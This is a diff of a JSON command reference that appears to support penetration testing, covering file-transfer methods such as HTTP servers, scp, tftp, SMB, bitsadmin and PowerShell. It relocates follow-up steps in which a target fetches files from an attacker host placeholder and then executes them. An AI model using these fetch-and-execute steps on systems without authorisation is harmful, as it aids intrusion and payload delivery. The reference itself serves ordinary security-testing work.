@@ -24,11 +24,12 @@
       "alternatives": [
         "ruby-http-server"
       ],
-      "next_steps": [
-        "wget http://<LHOST>:<PORT>/<FILE> (on target)"
-      ],
+      "next_steps": [],
       "flag_explanations": {
         "-S": "Run built-in web server"
+      },
+      "methodology_guidance": {
+        "after_success": "wget http://<LHOST>:<PORT>/<FILE> (on target)"
       }
     },
     {
@@ -55,9 +56,10 @@
       "alternatives": [
         "php-http-server"
       ],
-      "next_steps": [
-        "curl http://<LHOST>:<PORT>/<FILE> -o <FILE> (on target)"
-      ]
+      "next_steps": [],
+      "methodology_guidance": {
+        "after_success": "curl http://<LHOST>:<PORT>/<FILE> -o <FILE> (on target)"
+      }
     },
     {
       "id": "scp-upload",
@@ -99,13 +101,13 @@
         "upload"
       ],
       "prerequisites": [],
-      "next_steps": [
-        "chmod +x on uploaded file",
-        "Execute"
-      ],
+      "next_steps": [],
       "flag_explanations": {
         "-P": "Specify SSH port (uppercase P)",
         "-r": "Recursive (for directories)"
+      },
+      "methodology_guidance": {
+        "after_success": "chmod +x on uploaded file Execute"
       }
     },
     {
@@ -148,9 +150,10 @@
         "download"
       ],
       "prerequisites": [],
-      "next_steps": [
-        "Analyze downloaded file"
-      ]
+      "next_steps": [],
+      "methodology_guidance": {
+        "after_success": "Analyze downloaded file"
+      }
     },
     {
       "id": "tftp-upload",
@@ -180,13 +183,14 @@
         "windows"
       ],
       "prerequisites": [],
-      "next_steps": [
-        "Verify file transfer"
-      ],
+      "next_steps": [],
       "flag_explanations": {
         "-i": "Binary mode (Windows)",
         "PUT": "Upload file",
         "GET": "Download file"
+      },
+      "methodology_guidance": {
+        "after_success": "Verify file transfer"
       }
     },
     {
@@ -216,13 +220,14 @@
         "smb",
         "file-transfer"
       ],
-      "next_steps": [
-        "copy \\\\<LHOST>\\<SHARE_NAME>\\<FILE> <DEST> (on Windows target)"
-      ],
+      "next_steps": [],
       "flag_explanations": {
         "-smb2support": "Enable SMB2 support",
         "-username": "Require authentication",
         "-password": "Set password"
+      },
+      "methodology_guidance": {
+        "after_success": "copy \\\\<LHOST>\\<SHARE_NAME>\\<FILE> <DEST> (on Windows target)"
       }
     },
     {
@@ -260,13 +265,14 @@
         "download"
       ],
       "prerequisites": [],
-      "next_steps": [
-        "Execute downloaded file"
-      ],
+      "next_steps": [],
       "flag_explanations": {
         "/transfer": "Transfer job name",
         "/download": "Download mode",
         "/priority": "Priority level"
+      },
+      "methodology_guidance": {
+        "after_success": "Execute downloaded file"
       }
     },
     {
@@ -306,9 +312,10 @@
       "alternatives": [
         "powershell-invoke-webrequest"
       ],
-      "next_steps": [
-        "Execute downloaded file"
-      ]
+      "next_steps": [],
+      "methodology_guidance": {
+        "after_success": "Execute downloaded file"
+      }
     },
     {
       "id": "powershell-invoke-webrequest",
@@ -345,12 +352,13 @@
         "download"
       ],
       "prerequisites": [],
-      "next_steps": [
-        "Execute downloaded file"
-      ],
+      "next_steps": [],
       "flag_explanations": {
         "-Uri": "URL to download",
         "-OutFile": "Output file path"
+      },
+      "methodology_guidance": {
+        "after_success": "Execute downloaded file"
       }
     }
   ]
